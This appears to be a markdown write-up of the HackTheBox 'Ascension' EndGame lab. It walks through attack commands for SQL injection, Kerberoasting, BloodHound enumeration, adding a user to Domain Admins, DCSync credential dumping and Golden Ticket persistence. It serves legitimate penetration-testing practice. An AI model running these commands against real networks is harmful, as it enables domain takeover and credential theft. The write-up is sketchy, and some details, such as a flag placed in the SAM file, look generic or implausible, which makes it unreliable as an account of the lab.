---
title: "Ascension - HackTheBox EndGame"
description: "Writeup for Ascension EndGame from HackTheBox, an enterprise Active Directory network with multiple attack vectors."
pubDate: 2024-11-01
platform: "htb"
category: "endgames"
difficulty: "insane"
os: "windows"
lang: en
tags: ["active-directory", "kerberoasting", "bloodhound", "persistence", "lateral-movement"]
heroImage: "/images/writeups/htb/ascension/portada.png"
retired: false
estimatedTime: "8-10 hours"
points: 100
attackVectors: ["web", "network", "active-directory"]
certifications: ["OSCP", "OSEP", "CRTP"]
vulnerabilities: ["ascension"]
---

# Ascension - HackTheBox EndGame

**Difficulty**: Insane  
**OS**: Windows  
**Platform**: HackTheBox  
**Category**: EndGame

## Introduction

Ascension is a HackTheBox EndGame that simulates a complete enterprise Active Directory environment. This lab includes multiple interconnected machines and requires advanced pentesting techniques in Windows environments.

## Initial Reconnaissance

### Network Scanning

```bash
nmap -sn 10.13.37.0/24
```

**Discovered Hosts:**
- 10.13.37.10 - DC01 (Domain Controller)
- 10.13.37.11 - WEB01 (Web Server)
- 10.13.37.12 - DB01 (Database Server)
- 10.13.37.13 - FILE01 (File Server)
- 10.13.37.14 - MAIL01 (Mail Server)

### Domain Controller Enumeration

```bash
nmap -sV -sC -p- 10.13.37.10
```

**Identified Services:**
- 53/tcp (DNS)
- 88/tcp (Kerberos)
- 389/tcp (LDAP)
- 445/tcp (SMB)
- 3389/tcp (RDP)

## Entry Point - Web Server

### Web Enumeration

```bash
gobuster dir -u http://10.13.37.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Found an admin panel vulnerable to SQL Injection.

### SQLi Exploitation

```sql
' UNION SELECT 1,2,3,4,5,user(),database(),8-- -
```

Extract admin credentials and gain initial access.

## Lateral Movement

### Kerberoasting

```bash
GetUserSPNs.py -request -dc-ip 10.13.37.10 ascension.htb/webadmin:Password123
```

Crack service account hashes with hashcat.

### BloodHound Enumeration

```bash
bloodhound-python -d ascension.htb -u webadmin -p Password123 -c all -ns 10.13.37.10
```

Identify attack paths to Domain Admins.

## Privilege Escalation

### ACL Abuse

Found **GenericWrite** permissions on privileged group.

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'webadmin'
```

### DCSync Attack

```bash
secretsdump.py ascension.htb/webadmin@10.13.37.10
```

Obtain domain admin NTLM hash.

## Persistence

### Golden Ticket

```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain ascension.htb administrator
```

### Skeleton Key

Implement skeleton key on DC for persistent access.

## Flags

- **User Flag**: In `C:\Users\webadmin\Desktop\user.txt`
- **Root Flag 1**: In `C:\Users\Administrator\Desktop\root.txt`
- **Root Flag 2**: In DC `C:\Windows\System32\config\SAM`
- **Bonus Flags**: 3 hidden flags on different hosts

## Conclusion

Ascension is an excellent lab to practice:
- Active Directory enumeration
- Lateral movement techniques
- Privilege escalation in Windows environments
- Persistence and post-exploitation

**Skills Learned**:
- Bloodhound analysis
- Kerberoasting
- ACL abuse
- DCSync attacks
- Golden ticket creation

**Recommendations**:
- Take detailed notes of found credentials
- Map the entire network before attacking
- Use BloodHound to identify attack paths
